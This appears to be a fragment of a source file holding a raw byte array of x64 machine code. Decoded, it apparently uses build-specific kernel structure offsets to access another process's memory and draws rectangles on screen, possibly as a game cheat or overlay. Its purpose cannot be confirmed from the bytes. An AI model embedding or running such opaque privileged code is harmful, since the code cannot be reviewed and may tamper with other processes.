0x48, 0x8B, 0x48, 0x08, 0x48, 0x8D, 0x55, 0xD7, 0x48, 0x83, 0xC1, 0x38, 0x41, 0xB0, 0x01, 0xFF,
0x15, 0x43, 0x29, 0x00, 0x00, 0x85, 0xC0, 0x74, 0x10, 0x4C, 0x8B, 0x2B, 0x49, 0x8B, 0x45, 0x18,
0x49, 0x8D, 0x5D, 0x18, 0x48, 0x85, 0xC0, 0x75, 0xD7, 0x49, 0x83, 0x7D, 0x18, 0x00, 0x0F, 0x84,
0xA7, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x76, 0x08, 0x4D, 0x85, 0xF6, 0x0F, 0x84, 0x9A, 0x00, 0x00,
0x00, 0x4D, 0x39, 0x75, 0x18, 0x75, 0x7A, 0x49, 0x8B, 0x7D, 0x40, 0x33, 0xF6, 0x48, 0xC7, 0x05,
0x78, 0x3D, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x1F, 0x84, 0x00, 0x00, 0x00, 0x00, 0x00,
0x48, 0x8B, 0xCF, 0xFF, 0x15, 0xDF, 0x28, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x54, 0x48, 0x83, 0x3D,
0x5B, 0x3D, 0x00, 0x00, 0x00, 0x74, 0x0A, 0x48, 0x83, 0x3D, 0xB9, 0x3D, 0x00, 0x00, 0x00, 0x75,
0x71, 0x48, 0x8B, 0x1F, 0x49, 0x3B, 0xDE, 0x75, 0x09, 0x4C, 0x89, 0x35, 0x40, 0x3D, 0x00, 0x00,
0xEB, 0x22, 0x49, 0x3B, 0xDF, 0x76, 0x1D, 0x4B, 0x8D, 0x04, 0x27, 0x48, 0x3B, 0xD8, 0x73, 0x14,
0x48, 0x8B, 0xCB, 0xFF, 0x15, 0x9F, 0x28, 0x00, 0x00, 0x84, 0xC0, 0x74, 0x07, 0x48, 0x89, 0x1D,
0x84, 0x3D, 0x00, 0x00, 0xFF, 0xC6, 0x48, 0xFF, 0xC7, 0x81, 0xFE, 0x00, 0x10, 0x00, 0x00, 0x72,
0x9F, 0x49, 0x8B, 0x46, 0x10, 0x4C, 0x8B, 0xF0, 0x48, 0x85, 0xC0, 0x0F, 0x85, 0x70, 0xFF, 0xFF,
0xFF, 0x8B, 0x7D, 0x67, 0x48, 0x8D, 0x35, 0x45, 0x26, 0x00, 0x00, 0x48, 0x8B, 0x5D, 0x7F, 0x48,
0x8B, 0x5B, 0x10, 0x48, 0x89, 0x5D, 0x7F, 0x48, 0x85, 0xDB, 0x0F, 0x85, 0xD0, 0xFE, 0xFF, 0xFF,
0xEB, 0x06, 0x45, 0x33, 0xED, 0x41, 0x8B, 0xFD, 0x48, 0x8B, 0x4D, 0x77, 0xFF, 0x15, 0x8E, 0x27,
0x00, 0x00, 0x8B, 0xC7, 0x48, 0x81, 0xC4, 0x98, 0x00, 0x00, 0x00, 0x41, 0x5F, 0x41, 0x5E, 0x41,
0x5D, 0x41, 0x5C, 0x5F, 0x5E, 0x5B, 0x5D, 0xC3, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC, 0xCC,
0x48, 0x89, 0x5C, 0x24, 0x08, 0x55, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57,
0x48, 0x83, 0xEC, 0x60, 0x33, 0xF6, 0x4C, 0x8D, 0x05, 0x23, 0xC7, 0xFF, 0xFF, 0x4C, 0x8D, 0x1D,
0x6C, 0x3D, 0x00, 0x00, 0x48, 0x8D, 0x2D, 0xF5, 0x39, 0x00, 0x00, 0x48, 0x8D, 0x3D, 0xEE, 0x3B,
0x00, 0x00, 0x48, 0x8D, 0x1D, 0xEF, 0x3B, 0x00, 0x00, 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00,
0x80, 0x3D, 0x39, 0x37, 0x00, 0x00, 0x00, 0x0F, 0x85, 0xFF, 0x04, 0x00, 0x00, 0x48, 0x8B, 0x0D,
0xD4, 0x3B, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00, 0x00, 0xF0, 0x0F, 0xB1, 0x31, 0x0F, 0x85, 0xE9,
0x04, 0x00, 0x00, 0x48, 0x8B, 0x05, 0xBE, 0x3B, 0x00, 0x00, 0x8B, 0xCE, 0x87, 0x08, 0x48, 0x8B,
0x05, 0xB3, 0x3B, 0x00, 0x00, 0x8B, 0x48, 0x10, 0x39, 0x0D, 0xA2, 0x3B, 0x00, 0x00, 0x0F, 0x84,
0x8E, 0x00, 0x00, 0x00, 0x85, 0xC9, 0x0F, 0x84, 0x86, 0x00, 0x00, 0x00, 0x89, 0x0D, 0x8E, 0x3B,
0x00, 0x00, 0xE8, 0x19, 0xDA, 0xFF, 0xFF, 0x48, 0x89, 0x05, 0xBA, 0x3B, 0x00, 0x00, 0x48, 0x8B,
0xC8, 0x48, 0x85, 0xC0, 0x75, 0x05, 0x48, 0x8B, 0xD6, 0xEB, 0x50, 0x48, 0x8B, 0x50, 0x28, 0x48,
0x85, 0xD2, 0x75, 0x47, 0x8B, 0x05, 0x66, 0x3C, 0x00, 0x00, 0x85, 0xC0, 0x75, 0x39, 0x8B, 0x05,
0x18, 0x3D, 0x00, 0x00, 0x2D, 0xEE, 0x42, 0x00, 0x00, 0x74, 0x21, 0x2D, 0x75, 0x02, 0x00, 0x00,
0x74, 0x1A, 0x2D, 0x57, 0x02, 0x00, 0x00, 0x74, 0x0C, 0x83, 0xF8, 0x01, 0x74, 0x07, 0xB8, 0x88,
0x03, 0x00, 0x00, 0xEB, 0x0C, 0xB8, 0x80, 0x02, 0x00, 0x00, 0xEB, 0x05, 0xB8, 0x78, 0x02, 0x00,
0x00, 0x89, 0x05, 0x29, 0x3C, 0x00, 0x00, 0x48, 0x8B, 0x14, 0x08, 0x48, 0x89, 0x15, 0x5E, 0x3B,
0x00, 0x00, 0x4C, 0x8D, 0x05, 0x37, 0xC6, 0xFF, 0xFF, 0x4C, 0x8D, 0x1D, 0x80, 0x3C, 0x00, 0x00,
0xEB, 0x07, 0x48, 0x8B, 0x15, 0x47, 0x3B, 0x00, 0x00, 0x4C, 0x8B, 0x15, 0x08, 0x3B, 0x00, 0x00,
0x41, 0x8B, 0x42, 0x08, 0x3D, 0xBC, 0x01, 0x00, 0x00, 0x0F, 0x8F, 0xF9, 0x03, 0x00, 0x00, 0x0F,
0x84, 0x22, 0x06, 0x00, 0x00, 0xFF, 0xC8, 0x83, 0xF8, 0x07, 0x0F, 0x87, 0xE8, 0x03, 0x00, 0x00,
0x48, 0x98, 0x41, 0x8B, 0x8C, 0x80, 0x5C, 0x40, 0x00, 0x00, 0x49, 0x03, 0xC8, 0xFF, 0xE1, 0x41,
0x8B, 0x82, 0x20, 0x10, 0x00, 0x00, 0x4D, 0x8D, 0x4A, 0x20, 0x4D, 0x8B, 0x42, 0x18, 0x48, 0x8D,
0x0D, 0x0B, 0x3C, 0x00, 0x00, 0x4C, 0x89, 0x5C, 0x24, 0x28, 0x89, 0x44, 0x24, 0x20, 0xE8, 0xBD,
0xF0, 0xFF, 0xFF, 0x48, 0x8B, 0x0D, 0xAE, 0x3A, 0x00, 0x00, 0x89, 0x41, 0x0C, 0xE9, 0xA6, 0x03,
0x00, 0x00, 0x41, 0x8B, 0x82, 0x20, 0x10, 0x00, 0x00, 0x4D, 0x8D, 0x4A, 0x20, 0x4D, 0x8B, 0x42,
0x18, 0x48, 0x8D, 0x0D, 0xD8, 0x3B, 0x00, 0x00, 0x4C, 0x89, 0x5C, 0x24, 0x28, 0x89, 0x44, 0x24,
0x20, 0xE8, 0xFA, 0xF1, 0xFF, 0xFF, 0x48, 0x8B, 0x0D, 0x7B, 0x3A, 0x00, 0x00, 0x89, 0x41, 0x0C,
0xE9, 0x73, 0x03, 0x00, 0x00, 0x81, 0x3D, 0x1D, 0x3C, 0x00, 0x00, 0xF4, 0x65, 0x00, 0x00, 0x4D,
0x8D, 0x8A, 0x30, 0x20, 0x00, 0x00, 0x4D, 0x8D, 0x82, 0x28, 0x20, 0x00, 0x00, 0x49, 0x8D, 0x92,
0x24, 0x10, 0x00, 0x00, 0x75, 0x14, 0xE8, 0x45, 0xF5, 0xFF, 0xFF, 0x48, 0x8B, 0x0D, 0x46, 0x3A,
0x00, 0x00, 0x89, 0x41, 0x0C, 0xE9, 0x3E, 0x03, 0x00, 0x00, 0xE8, 0x91, 0xF6, 0xFF, 0xFF, 0x48,
0x8B, 0x0D, 0x32, 0x3A, 0x00, 0x00, 0x89, 0x41, 0x0C, 0xE9, 0x2A, 0x03, 0x00, 0x00, 0x48, 0x8B,
0x05, 0x13, 0x3B, 0x00, 0x00, 0x49, 0x8D, 0x92, 0x50, 0x20, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F,
0x84, 0x13, 0x03, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x94, 0x3A, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x0F,
0x84, 0x03, 0x03, 0x00, 0x00, 0x48, 0x85, 0xD2, 0x0F, 0x84, 0xFA, 0x02, 0x00, 0x00, 0x4C, 0x8D,
0x42, 0x0C, 0x89, 0xB4, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x8C, 0x24, 0xA8, 0x00, 0x00,
0x00, 0xFF, 0xD0, 0xE9, 0xE0, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x01, 0x3B, 0x00, 0x00, 0x49,
0x8D, 0x92, 0x38, 0x20, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xC9, 0x02, 0x00, 0x00, 0x48,
0x8B, 0x0D, 0xC2, 0x3A, 0x00, 0x00, 0x48, 0x85, 0xC9, 0x0F, 0x84, 0xB9, 0x02, 0x00, 0x00, 0x48,
0x85, 0xD2, 0x0F, 0x84, 0xB0, 0x02, 0x00, 0x00, 0x4C, 0x8D, 0x42, 0x18, 0x89, 0xB4, 0x24, 0xB0,
0x00, 0x00, 0x00, 0x4C, 0x8D, 0x8C, 0x24, 0xB0, 0x00, 0x00, 0x00, 0xFF, 0xD0, 0xE9, 0x96, 0x02,
0x00, 0x00, 0x8B, 0x0D, 0x88, 0x39, 0x00, 0x00, 0xE8, 0x13, 0xD8, 0xFF, 0xFF, 0x48, 0x8B, 0x0D,
0xDC, 0x24, 0x00, 0x00, 0x48, 0x8B, 0xD8, 0x4C, 0x8B, 0x15, 0x0A, 0x3A, 0x00, 0x00, 0x48, 0x8D,
0x44, 0x24, 0x48, 0x48, 0x89, 0x44, 0x24, 0x30, 0x41, 0xB9, 0x00, 0x00, 0x1F, 0x00, 0x48, 0x89,
0x74, 0x24, 0x48, 0x45, 0x33, 0xC0, 0x48, 0x8B, 0x11, 0x48, 0x8B, 0xCB, 0xC6, 0x44, 0x24, 0x28,
0x00, 0x48, 0x89, 0x54, 0x24, 0x20, 0xBA, 0x00, 0x02, 0x00, 0x00, 0x41, 0xFF, 0xD2, 0x48, 0x8B,
0x0D, 0x43, 0x39, 0x00, 0x00, 0x89, 0x41, 0x0C, 0x85, 0xC0, 0x79, 0x0E, 0x48, 0x8B, 0xCB, 0xFF,
0x15, 0x7B, 0x24, 0x00, 0x00, 0xE9, 0x2E, 0x02, 0x00, 0x00, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0x33,
0xD2, 0xFF, 0x15, 0xD1, 0x24, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0x1A, 0x39, 0x00, 0x00, 0x33, 0xD2,
0x89, 0x41, 0x0C, 0x48, 0x8B, 0x4C, 0x24, 0x48, 0xFF, 0x15, 0xB2, 0x39, 0x00, 0x00, 0x48, 0x8B,
0xCB, 0xFF, 0x15, 0x49, 0x24, 0x00, 0x00, 0xE9, 0xFC, 0x01, 0x00, 0x00, 0x48, 0x83, 0x3D, 0x74,
0x39, 0x00, 0x00, 0x00, 0x75, 0x12, 0x48, 0x8B, 0x05, 0x33, 0x39, 0x00, 0x00, 0x33, 0xC9, 0xFF,
0xD0, 0x48, 0x89, 0x05, 0x60, 0x39, 0x00, 0x00, 0x4C, 0x8B, 0x0D, 0xD9, 0x38, 0x00, 0x00, 0x48,
0x8B, 0xD5, 0x4C, 0x8B, 0x52, 0x08, 0x4D, 0x85, 0xD2, 0x74, 0x2A, 0x41, 0x0F, 0xB6, 0x89, 0x60,
0x20, 0x00, 0x00, 0x41, 0x0F, 0xB6, 0x81, 0x64, 0x20, 0x00, 0x00, 0xC1, 0xE1, 0x08, 0xC1, 0xE0,
0x10, 0x0B, 0xC8, 0x41, 0x0F, 0xB6, 0x81, 0x5C, 0x20, 0x00, 0x00, 0x0B, 0xC8, 0x39, 0x0A, 0x0F,
0x84, 0x92, 0x00, 0x00, 0x00, 0x48, 0x83, 0xC2, 0x10, 0x48, 0x3B, 0xD7, 0x7C, 0xC4, 0x48, 0x8B,
0x15, 0x93, 0x38, 0x00, 0x00, 0x41, 0x0F, 0xB6, 0x89, 0x60, 0x20, 0x00, 0x00, 0x4C, 0x8B, 0x05,
0xC4, 0x38, 0x00, 0x00, 0xC1, 0xE1, 0x08, 0x0F, 0xB6, 0x82, 0x64, 0x20, 0x00, 0x00, 0xC1, 0xE0,
0x10, 0x0B, 0xC8, 0x0F, 0xB6, 0x82, 0x5C, 0x20, 0x00, 0x00, 0x0B, 0xC8, 0x33, 0xD2, 0x41, 0xFF,
0xD0, 0x4C, 0x8B, 0xD0, 0x48, 0x8D, 0x0D, 0x5D, 0x36, 0x00, 0x00, 0x4C, 0x8B, 0xC6, 0x66, 0x90,
0x48, 0x83, 0x39, 0x00, 0x74, 0x0E, 0x49, 0xFF, 0xC0, 0x48, 0x83, 0xC1, 0x10, 0x48, 0x3B, 0xCB,
0x7C, 0xEE, 0xEB, 0x33, 0x48, 0x8B, 0x0D, 0x3D, 0x38, 0x00, 0x00, 0x4D, 0x03, 0xC0, 0x0F, 0xB6,
0x91, 0x60, 0x20, 0x00, 0x00, 0x0F, 0xB6, 0x81, 0x64, 0x20, 0x00, 0x00, 0xC1, 0xE0, 0x10, 0xC1,
0xE2, 0x08, 0x0B, 0xD0, 0x0F, 0xB6, 0x81, 0x5C, 0x20, 0x00, 0x00, 0x0B, 0xD0, 0x4E, 0x89, 0x54,
0xC5, 0x08, 0x42, 0x89, 0x54, 0xC5, 0x00, 0x48, 0x8B, 0x05, 0x0A, 0x38, 0x00, 0x00, 0x49, 0x8B,
0xD2, 0x48, 0x8B, 0x2D, 0x80, 0x38, 0x00, 0x00, 0x48, 0x8B, 0xCD, 0x44, 0x8B, 0xA8, 0x68, 0x20,
0x00, 0x00, 0x44, 0x8B, 0xA0, 0x6C, 0x20, 0x00, 0x00, 0x8B, 0xB0, 0x70, 0x20, 0x00, 0x00, 0x8B,
0xB8, 0x74, 0x20, 0x00, 0x00, 0x44, 0x8B, 0xB8, 0x78, 0x20, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x3D,
0x38, 0x00, 0x00, 0xFF, 0xD0, 0x4C, 0x8B, 0xF0, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0xB7, 0x00, 0x00,
0x00, 0x85, 0xF6, 0x0F, 0x8E, 0xA3, 0x00, 0x00, 0x00, 0x85, 0xFF, 0x0F, 0x8E, 0x9B, 0x00, 0x00,
0x00, 0x43, 0x8D, 0x1C, 0x3F, 0x3B, 0xDE, 0x0F, 0x8F, 0x8F, 0x00, 0x00, 0x00, 0x3B, 0xDF, 0x0F,
0x8F, 0x87, 0x00, 0x00, 0x00, 0xC7, 0x44, 0x24, 0x28, 0x21, 0x00, 0xF0, 0x00, 0x45, 0x8B, 0xCF,
0x45, 0x8B, 0xC4, 0x89, 0x7C, 0x24, 0x20, 0x41, 0x8B, 0xD5, 0x48, 0x8B, 0xCD, 0xFF, 0x15, 0xE5,
0x37, 0x00, 0x00, 0x8B, 0xD6, 0xC7, 0x44, 0x24, 0x28, 0x21, 0x00, 0xF0, 0x00, 0x41, 0x2B, 0xD7,
0x89, 0x7C, 0x24, 0x20, 0x41, 0x03, 0xD5, 0x45, 0x8B, 0xCF, 0x45, 0x8B, 0xC4, 0x48, 0x8B, 0xCD,
0xFF, 0x15, 0xC2, 0x37, 0x00, 0x00, 0x2B, 0xF3, 0xC7, 0x44, 0x24, 0x28, 0x21, 0x00, 0xF0, 0x00,
0x43, 0x8D, 0x1C, 0x2F, 0x44, 0x89, 0x7C, 0x24, 0x20, 0x8B, 0xD3, 0x44, 0x8B, 0xCE, 0x45, 0x8B,
0xC4, 0x48, 0x8B, 0xCD, 0xFF, 0x15, 0x9E, 0x37, 0x00, 0x00, 0x41, 0x2B, 0xFF, 0xC7, 0x44, 0x24,
0x28, 0x21, 0x00, 0xF0, 0x00, 0x44, 0x8B, 0xCE, 0x44, 0x89, 0x7C, 0x24, 0x20, 0x8B, 0xD3, 0x48,
0x8B, 0xCD, 0x45, 0x8D, 0x04, 0x3C, 0xFF, 0x15, 0x7C, 0x37, 0x00, 0x00, 0x49, 0x8B, 0xD6, 0x48,
0x8B, 0xCD, 0xFF, 0x15, 0x78, 0x37, 0x00, 0x00, 0x48, 0x8D, 0x3D, 0x01, 0x37, 0x00, 0x00, 0x33,
0xF6, 0x48, 0x8D, 0x2D, 0xF8, 0x34, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0xF9, 0x36, 0x00, 0x00, 0x48,
0x8D, 0x1D, 0xF2, 0x36, 0x00, 0x00, 0xB8, 0x01, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x05, 0xFE, 0xC1,
0xFF, 0xFF, 0x4C, 0x8D, 0x1D, 0x47, 0x38, 0x00, 0x00, 0x87, 0x41, 0x04, 0xF3, 0x90, 0xE9, 0xED,
0xFA, 0xFF, 0xFF, 0x48, 0x83, 0x3D, 0x4D, 0x37, 0x00, 0x00, 0x00, 0x75, 0x12, 0x48, 0x8B, 0x05,
0x0C, 0x37, 0x00, 0x00, 0x33, 0xC9, 0xFF, 0xD0, 0x48, 0x89, 0x05, 0x39, 0x37, 0x00, 0x00, 0x4C,
0x8B, 0x05, 0xB2, 0x36, 0x00, 0x00, 0x48, 0x8B, 0xC5, 0x0F, 0x1F, 0x80, 0x00, 0x00, 0x00, 0x00,
0x4C, 0x8B, 0x48, 0x08, 0x4D, 0x85, 0xC9, 0x74, 0x2A, 0x41, 0x0F, 0xB6, 0x90, 0x60, 0x20, 0x00,
0x00, 0x41, 0x0F, 0xB6, 0x88, 0x64, 0x20, 0x00, 0x00, 0xC1, 0xE2, 0x08, 0xC1, 0xE1, 0x10, 0x0B,
0xD1, 0x41, 0x0F, 0xB6, 0x88, 0x5C, 0x20, 0x00, 0x00, 0x0B, 0xD1, 0x39, 0x10, 0x0F, 0x84, 0x94,
0x00, 0x00, 0x00, 0x48, 0x83, 0xC0, 0x10, 0x48, 0x3B, 0xC7, 0x7C, 0xC4, 0x48, 0x8B, 0x15, 0x65,
0x36, 0x00, 0x00, 0x4C, 0x8B, 0x05, 0x9E, 0x36, 0x00, 0x00, 0x0F, 0xB6, 0x8A, 0x60, 0x20, 0x00,
0x00, 0x0F, 0xB6, 0x82, 0x64, 0x20, 0x00, 0x00, 0xC1, 0xE1, 0x08, 0xC1, 0xE0, 0x10, 0x0B, 0xC8,
0x0F, 0xB6, 0x82, 0x5C, 0x20, 0x00, 0x00, 0x0B, 0xC8, 0x33, 0xD2, 0x41, 0xFF, 0xD0, 0x4C, 0x8B,
0xC8, 0x48, 0x8D, 0x0D, 0x30, 0x34, 0x00, 0x00, 0x4C, 0x8B, 0xC6, 0x0F, 0x1F, 0x44, 0x00, 0x00,
0x48, 0x83, 0x39, 0x00, 0x74, 0x0E, 0x49, 0xFF, 0xC0, 0x48, 0x83, 0xC1, 0x10, 0x48, 0x3B, 0xCB,
0x7C, 0xEE, 0xEB, 0x33, 0x48, 0x8B, 0x0D, 0x0D, 0x36, 0x00, 0x00, 0x4D, 0x03, 0xC0, 0x0F, 0xB6,
0x91, 0x60, 0x20, 0x00, 0x00, 0x0F, 0xB6, 0x81, 0x64, 0x20, 0x00, 0x00, 0xC1, 0xE0, 0x10, 0xC1,
0xE2, 0x08, 0x0B, 0xD0, 0x0F, 0xB6, 0x81, 0x5C, 0x20, 0x00, 0x00, 0x0B, 0xD0, 0x4E, 0x89, 0x4C,
0xC5, 0x08, 0x42, 0x89, 0x54, 0xC5, 0x00, 0x48, 0x8B, 0x05, 0xDA, 0x35, 0x00, 0x00, 0x49, 0x8B,
0xD1, 0x4C, 0x8B, 0x35, 0x50, 0x36, 0x00, 0x00, 0x49, 0x8B, 0xCE, 0x8B, 0xB0, 0x78, 0x20, 0x00,
0x00, 0x8B, 0xA8, 0x80, 0x20, 0x00, 0x00, 0x44, 0x8B, 0xB8, 0x7C, 0x20, 0x00, 0x00, 0x8B, 0x98,
0x6C, 0x20, 0x00, 0x00, 0x8B, 0xB8, 0x68, 0x20, 0x00, 0x00, 0x48, 0x8B, 0x05, 0x0F, 0x36, 0x00,
0x00, 0xFF, 0xD0, 0x48, 0x89, 0x44, 0x24, 0x50, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x87, 0xFE, 0xFF,
0xFF, 0x41, 0x8B, 0xCF, 0x8B, 0xC5, 0x2B, 0xCF, 0x2B, 0xC3, 0x8B, 0xD1, 0xC1, 0xFA, 0x1F, 0x44,
0x8B, 0xEA, 0x44, 0x33, 0xE9, 0x8B, 0xC8, 0xC1, 0xF9, 0x1F, 0x44, 0x2B, 0xEA, 0x44, 0x8B, 0xC1,
0x45, 0x8B, 0xE5, 0x44, 0x33, 0xC0, 0x8D, 0x04, 0x55, 0x01, 0x00, 0x00, 0x00, 0x44, 0x2B, 0xC1,
0x89, 0x44, 0x24, 0x40, 0x8D, 0x04, 0x4D, 0x01, 0x00, 0x00, 0x00, 0x44, 0x89, 0x84, 0x24, 0xB8,
0x00, 0x00, 0x00, 0x89, 0x44, 0x24, 0x44, 0x45, 0x2B, 0xE0, 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00,
0xC7, 0x44, 0x24, 0x28, 0x21, 0x00, 0xF0, 0x00, 0x44, 0x8B, 0xCE, 0x44, 0x8B, 0xC3, 0x89, 0x74,
0x24, 0x20, 0x8B, 0xD7, 0x49, 0x8B, 0xCE, 0xFF, 0x15, 0x8B, 0x35, 0x00, 0x00, 0x41, 0x3B, 0xFF,
0x75, 0x04, 0x3B, 0xDD, 0x74, 0x44, 0x8B, 0x8C, 0x24, 0xB8, 0x00, 0x00, 0x00, 0x47, 0x8D, 0x04,
0x24, 0x8B, 0x44, 0x24, 0x40, 0x41, 0x8B, 0xD4, 0x2B, 0x94, 0x24, 0xB8, 0x00, 0x00, 0x00, 0xF7,
0xD9, 0x44, 0x3B, 0xC1, 0x41, 0x0F, 0x4E, 0xD4, 0x03, 0xC7, 0x44, 0x3B, 0xC1, 0x0F, 0x4E, 0xC7,
0x8B, 0xF8, 0x46, 0x8D, 0x24, 0x2A, 0x8B, 0x44, 0x24, 0x44, 0x03, 0xC3, 0x45, 0x3B, 0xC5, 0x0F,
0x4D, 0xC3, 0x44, 0x0F, 0x4D, 0xE2, 0x8B, 0xD8, 0xEB, 0x96, 0x48, 0x8B, 0x54, 0x24, 0x50, 0x49,
0x8B, 0xCE, 0xE9, 0xBB, 0xFD, 0xFF, 0xFF, 0x48, 0x8B, 0x0D, 0xF2, 0x34, 0x00, 0x00, 0x48, 0x85,
0xC9, 0x74, 0x2D, 0x48, 0x8B, 0x15, 0xDE, 0x34, 0x00, 0x00, 0x48, 0x85, 0xD2, 0x74, 0x21, 0xFF,
0x15, 0x6B, 0x20, 0x00, 0x00, 0x48, 0x8B, 0x0D, 0xCC, 0x34, 0x00, 0x00, 0x48, 0x89, 0x35, 0xCD,
0x34, 0x00, 0x00, 0xFF, 0x15, 0x2F, 0x20, 0x00, 0x00, 0x48, 0x89, 0x35, 0xB8, 0x34, 0x00, 0x00,
0xC6, 0x05, 0xE9, 0x2F, 0x00, 0x00, 0x01, 0xE9, 0x8C, 0xFD, 0xFF, 0xFF, 0x0F, 0x3A, 0x00, 0x00,
0x42, 0x3A, 0x00, 0x00, 0x75, 0x3A, 0x00, 0x00, 0xBE, 0x3A, 0x00, 0x00, 0x08, 0x3B, 0x00, 0x00,
0x52, 0x3B, 0x00, 0x00, 0xEC, 0x3B, 0x00, 0x00, 0x13, 0x3E, 0x00, 0x00, 0xCC, 0xCC, 0xCC, 0xCC,
0x40, 0x53, 0x56, 0x57, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xEC, 0x50,
0x45, 0x33, 0xE4, 0x4C, 0x8D, 0x2D, 0xB6, 0x35, 0x00, 0x00, 0x66, 0x0F, 0x1F, 0x44, 0x00, 0x00,
0x80, 0x3D, 0x99, 0x2F, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x40, 0x02, 0x00, 0x00, 0x48, 0x8D, 0x0D,
0xAC, 0x1E, 0x00, 0x00, 0xE8, 0x07, 0xD3, 0xFF, 0xFF, 0x85, 0xC0, 0x0F, 0x84, 0x2C, 0x02, 0x00,
0x00, 0x8B, 0xC8, 0xE8, 0xA8, 0xD2, 0xFF, 0xFF, 0x4C, 0x8B, 0xC0, 0x48, 0x85, 0xC0, 0x0F, 0x84,
0x19, 0x02, 0x00, 0x00, 0x4C, 0x8B, 0x78, 0x28, 0x4D, 0x85, 0xFF, 0x75, 0x55, 0x8B, 0x0D, 0xFD,
0x34, 0x00, 0x00, 0x85, 0xC9, 0x75, 0x3C, 0x8B, 0x0D, 0xAF, 0x35, 0x00, 0x00, 0x81, 0xE9, 0xEE,
0x42, 0x00, 0x00, 0x74, 0x23, 0x81, 0xE9, 0x75, 0x02, 0x00, 0x00, 0x74, 0x1B, 0x81, 0xE9, 0x57,
0x02, 0x00, 0x00, 0x74, 0x0C, 0x83, 0xF9, 0x01, 0x74, 0x07, 0xB9, 0x88, 0x03, 0x00, 0x00, 0xEB,
0x0C, 0xB9, 0x80, 0x02, 0x00, 0x00, 0xEB, 0x05, 0xB9, 0x78, 0x02, 0x00, 0x00, 0x89, 0x0D, 0xBD,
0x34, 0x00, 0x00, 0x8B, 0xC1, 0x4E, 0x8B, 0x3C, 0x00, 0x4D, 0x85, 0xFF, 0x0F, 0x84, 0xBB, 0x01,
0x00, 0x00, 0x4C, 0x89, 0xA4, 0x24, 0x98, 0x00, 0x00, 0x00, 0x4D, 0x8B, 0x80, 0xB0, 0x02, 0x00,
0x00, 0x49, 0x81, 0xC0, 0x60, 0x4D, 0x34, 0x01, 0x4C, 0x89, 0x6C, 0x24, 0x28, 0xC7, 0x44, 0x24,
0x20, 0x08, 0x00, 0x00, 0x00, 0x4C, 0x8D, 0x8C, 0x24, 0x98, 0x00, 0x00, 0x00, 0x49, 0x8B, 0xD7,
0x48, 0x8D, 0x0D, 0xC9, 0x34, 0x00, 0x00, 0xE8, 0x84, 0xE9, 0xFF, 0xFF, 0x85, 0xC0, 0x0F, 0x85,
0x5C, 0x01, 0x00, 0x00, 0x48, 0x83, 0xBC, 0x24, 0x98, 0x00, 0x00, 0x00, 0x00, 0x0F, 0x84, 0x4D,
0x01, 0x00, 0x00, 0x4C, 0x89, 0x64, 0x24, 0x20, 0x45, 0x33, 0xC9, 0x45, 0x33, 0xC0, 0xBA, 0x88,
0x20, 0x00, 0x00, 0x33, 0xC9, 0xFF, 0x15, 0x9D, 0x1E, 0x00, 0x00, 0x4C, 0x8B, 0xF0, 0x48, 0x89,
0x44, 0x24, 0x38, 0x48, 0x85, 0xC0, 0x0F, 0x84, 0x24, 0x01, 0x00, 0x00, 0x48, 0x8B, 0x8C, 0x24,
0x98, 0x00, 0x00, 0x00, 0x48, 0x81, 0xE1, 0x00, 0xF0, 0xFF, 0xFF, 0x48, 0x89, 0x48, 0x20, 0x8B,
0x8C, 0x24, 0x98, 0x00, 0x00, 0x00, 0x81, 0xE1, 0xFF, 0x0F, 0x00, 0x00, 0x89, 0x48, 0x2C, 0xC7,
0x40, 0x28, 0x88, 0x20, 0x00, 0x00, 0x48, 0x8D, 0x78, 0x30, 0x48, 0x8B, 0x8C, 0x24, 0x98, 0x00,
0x00, 0x00, 0x48, 0x8B, 0xF1, 0x81, 0xE6, 0xFF, 0x0F, 0x00, 0x00, 0x48, 0x81, 0xC6, 0x87, 0x30,
0x00, 0x00, 0x48, 0xC1, 0xEE, 0x0C, 0x41, 0x8B, 0xDC, 0x85, 0xF6, 0x74, 0x72, 0x0F, 0x1F, 0x00,
0x4C, 0x89, 0xA4, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x4C, 0x89, 0xA4, 0x24, 0xA8, 0x00, 0x00, 0x00,
0x44, 0x8B, 0xC3, 0x41, 0xC1, 0xE0, 0x0C, 0x4C, 0x03, 0xC1, 0x4C, 0x89, 0x6C, 0x24, 0x28, 0x48,
0x8D, 0x84, 0x24, 0xA8, 0x00, 0x00, 0x00, 0x48, 0x89, 0x44, 0x24, 0x20, 0x4C, 0x8D, 0x8C, 0x24,
0xA0, 0x00, 0x00, 0x00, 0x49, 0x8B, 0xD7, 0x48, 0x8D, 0x0D, 0xF2, 0x33, 0x00, 0x00, 0xE8, 0x6D,
0xE4, 0xFF, 0xFF, 0x48, 0x8B, 0x84, 0x24, 0xA0, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x0F, 0x84,
0xB6, 0x00, 0x00, 0x00, 0x48, 0xC1, 0xE8, 0x0C, 0x48, 0x89, 0x07, 0xFF, 0xC3, 0x48, 0x83, 0xC7,
0x08, 0x3B, 0xDE, 0x73, 0x0A, 0x48, 0x8B, 0x8C, 0x24, 0x98, 0x00, 0x00, 0x00, 0xEB, 0x91, 0x4C,
